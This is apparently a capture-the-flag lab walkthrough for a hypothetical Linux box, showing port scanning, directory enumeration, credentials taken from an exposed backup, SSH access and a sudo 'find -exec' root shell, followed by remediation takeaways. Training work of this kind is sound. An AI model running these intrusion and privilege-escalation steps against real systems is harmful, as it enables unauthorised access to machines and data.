
# LabBox-01 — Walkthrough

**Platform:** TryHackMe (Hypothetical)  
**Difficulty:** Easy  
**OS:** Linux  
**Target:** `10.10.10.45`  
**Status:** Root Compromised

---

## Overview

This walkthrough documents the methodology used to enumerate, exploit, and gain root-level access to LabBox-01.

### Skills Practiced

- Network reconnaissance
- Service enumeration
- Web directory discovery
- Credential discovery
- SSH authentication
- Linux privilege escalation

---

## 1. Reconnaissance

### 1.1 Initial Port Scan

**Command:**

~~~bash
nmap -sC -sV -oN nmap.txt 10.10.10.45
~~~

**Results:**

~~~text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd
~~~

### 1.2 Analysis

Two services were identified:

| Port | Service | Next Action |
|---|---|---|
| 22 | SSH | Identify credentials |
| 80 | HTTP | Enumerate directories |

> **Observation:** HTTP enumeration was prioritized because SSH authentication required credentials.

---

## 2. Enumeration

### 2.1 Directory Enumeration

**Command:**

~~~bash
gobuster dir \
-u http://10.10.10.45 \
-w /usr/share/wordlists/dirb/common.txt
~~~

**Results:**

~~~text
/admin       (Status: 403)
/backup      (Status: 301)
/index.html  (Status: 200)
~~~

### 2.2 Interesting Findings

The `/backup/` directory was accessible and contained an archive.

**Download:**

~~~bash
curl -O http://10.10.10.45/backup/site-backup.zip
~~~

**Extract:**

~~~bash
unzip site-backup.zip
~~~

### 2.3 Credential Discovery

The extracted archive contained a configuration file exposing credentials.

~~~text
Username: operator
Password: [REDACTED]
~~~

**Finding:** Sensitive credentials were exposed through a web-accessible backup.

![Directory Enumeration](screenshots/01-enumeration.png)

---

## 3. Initial Access

### 3.1 SSH Login

Attempted authentication using discovered credentials.

~~~bash
ssh operator@10.10.10.45
~~~

**Result:** Authentication successful.

### 3.2 User Verification

~~~bash
whoami
id
~~~

**Output:**

~~~text
operator
uid=1001(operator) gid=1001(operator)
~~~

### 3.3 User Flag

~~~bash
cat /home/operator/user.txt
~~~

**Status:** Obtained

![Initial Access](screenshots/02-initial-access.png)

---

## 4. Privilege Escalation

### 4.1 Sudo Enumeration

Checked available sudo permissions.

~~~bash
sudo -l
~~~

**Output:**

~~~text
(root) NOPASSWD: /usr/bin/find
~~~

### 4.2 Vulnerability Analysis

The `find` command supports arbitrary command execution using `-exec`.

Running it with unrestricted sudo permissions allows execution of commands as root.

### 4.3 Exploitation

~~~bash
sudo find . -exec /bin/sh \; -quit
~~~

**Verification:**

~~~bash
whoami
~~~

**Output:**

~~~text
root
~~~

### 4.4 Root Flag

~~~bash
cat /root/root.txt
~~~

**Status:** Obtained

![Root Access](screenshots/03-root-access.png)

---

## 5. Attack Chain

~~~text
[ Nmap Port Scan ]
        |
        v
[ HTTP Enumeration ]
        |
        v
[ Exposed Backup ]
        |
        v
[ Credential Discovery ]
        |
        v
[ SSH Initial Access ]
        |
        v
[ Sudo Misconfiguration ]
        |
        v
[ Root Access ]
~~~

---

## 6. Key Takeaways

### Vulnerabilities Identified

**1. Sensitive Backup Exposure**
- Backup files were publicly accessible.
- Credentials were stored in plaintext.

**2. Privilege Escalation**
- Unsafe sudo configuration.
- Excessive permissions assigned to a user.

### Lessons Learned

- Directory enumeration can reveal sensitive resources.
- Exposed credentials can provide initial access.
- Sudo permission auditing is important during Linux privilege escalation.

---

## 7. References

- [Nmap Documentation](https://nmap.org/docs.html)
- [GTFOBins](https://gtfobins.github.io/)
- [OWASP](https://owasp.org/)

---

**Disclaimer:** Educational demonstration in a hypothetical authorized lab.
